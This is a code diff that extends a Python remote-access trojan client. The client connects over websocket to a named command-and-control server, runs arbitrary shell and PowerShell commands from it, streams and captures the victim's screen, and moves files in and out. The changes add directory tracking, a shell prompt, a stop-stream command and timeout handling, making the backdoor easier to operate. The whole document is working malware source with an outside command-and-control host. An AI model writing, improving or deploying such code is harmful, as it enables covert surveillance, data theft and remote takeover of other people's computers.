@@ -13,8 +13,11 @@ import cv2
 import numpy as np
 from PIL import ImageGrab
 
+CURRENT_CWD = os.getcwd()
 C2_URL = "wss://textgame-9-c2.fly.dev/shell"
 SESSION_ID = "rs-" + socket.gethostname() + "-" + str(int(time.time()))
+
+STREAM_ACTIVE = False
 
 def send(ws, obj):
     try:
@@ -31,45 +34,87 @@ def fingerprint():
     }
 
 def stream_screen(ws):
+    global STREAM_ACTIVE
+    STREAM_ACTIVE = True
     try:
-        while True:
+        while STREAM_ACTIVE:
             screenshot = pyautogui.screenshot()
             frame = np.array(screenshot)
             frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
             _, buffer = cv2.imencode('.jpg', frame)
             b64 = base64.b64encode(buffer).decode('utf-8')
             
-            # Send as a streaming event
             send(ws, {"t": "reply", "data": f"[STREAM] {b64}"})
             time.sleep(0.1) # ~10 FPS
     except Exception as e:
-        send(ws, {"t": "reply", "data": f"[-] Stream error: {e}"})
+        send(ws, {"t": "reply", "data": f"[-] Stream error: {e}\n"})
+    finally:
+        STREAM_ACTIVE = False
+        send(ws, {"t": "reply", "data": "[-] Stream stopped.\n"})
 
 def run_cmd(ws, cmd):
+    global CURRENT_CWD
+    cmd = cmd.strip()
+
+    if cmd.lower().startswith("cd "):
+        target = cmd[3:].strip().strip('"').strip("'")
+        try:
+            if not os.path.isabs(target):
+                new_path = os.path.join(CURRENT_CWD, target)
+            else:
+                new_path = target
+                
+            new_path = os.path.abspath(new_path)
+            
+            if os.path.isdir(new_path):
+                CURRENT_CWD = new_path
+                send(ws, {"t": "reply", "data": f"Changed directory to: {CURRENT_CWD}\n"})
+            else:
+                send(ws, {"t": "reply", "data": f"cd: no such directory: {target}\n"})
+        except Exception as e:
+            send(ws, {"t": "reply", "data": f"cd failed: {e}\n"})
+        return
+
     try:
         if 'powershell' in cmd:
-            proc = subprocess.Popen(["powershell.exe"] + cmd.split()[1:], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+            proc = subprocess.Popen(
+                ["powershell.exe"] + cmd.split()[1:], 
+                cwd=CURRENT_CWD,
+                stdout=subprocess.PIPE, 
+                stderr=subprocess.STDOUT
+            )
         else:
-            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+            proc = subprocess.Popen(
+                cmd, 
+                shell=True, 
+                cwd=CURRENT_CWD,
+                stdout=subprocess.PIPE, 
+                stderr=subprocess.STDOUT
+            )
             
         out, _ = proc.communicate(timeout=60)
         text = out.decode("utf-8", errors="ignore")
         if not text:
             text = f"[exit {proc.returncode}, no output]"
-        send(ws, {"t": "reply", "data": text})
+            
+        send(ws, {"t": "reply", "data": f"{text}\n{CURRENT_CWD}> "})
+        
+    except subprocess.TimeoutExpired:
+        proc.kill()
+        send(ws, {"t": "reply", "data": "[timeout 60s]\n"})
     except Exception as e:
-        send(ws, {"t": "reply", "data": f"[exec error] {e}"})
+        send(ws, {"t": "reply", "data": f"[exec error] {e}\n"})
 
 def do_screenshot(ws):
     try:
         snapshot = ImageGrab.grab()
-        file = os.environ["appdata"] + '\\' + "IMage.jpg"
+        file = os.environ.get("appdata", os.getcwd()) + '\\' + "IMage.jpg"
         snapshot.save(file)
         with open(file, "rb") as f:
             b64 = base64.b64encode(f.read()).decode('utf-8')
             send(ws, {"t": "reply", "data": f"[SCREENSHOT] {b64}"})
     except Exception as e:
-        send(ws, {"t": "reply", "data": f"[-] Screenshot error: {e}"})
+        send(ws, {"t": "reply", "data": f"[-] Screenshot error: {e}\n"})
 
 def do_upload(ws, path, b64_data):
     try:
@@ -93,6 +138,7 @@ def do_download(ws, path):
         send(ws, {"t": "download", "path": path, "error": str(e)})
 
 def main():
+    global STREAM_ACTIVE
     while True:
         try:
             ws = websocket.create_connection(C2_URL, timeout=30)
@@ -109,7 +155,11 @@ def main():
                 t = frame.get("t")
                 if t == "cmd":
                     cmd = frame.get("cmd", "")
-                    if "stream" in cmd:
+                    if "stopstream" in cmd:
+                        STREAM_ACTIVE = False
+                    elif "stream" in cmd:
+                        STREAM_ACTIVE = False
+                        time.sleep(0.2)
                         threading.Thread(target=stream_screen, args=(ws,), daemon=True).start()
                     elif "screenshot" in cmd:
                         do_screenshot(ws)
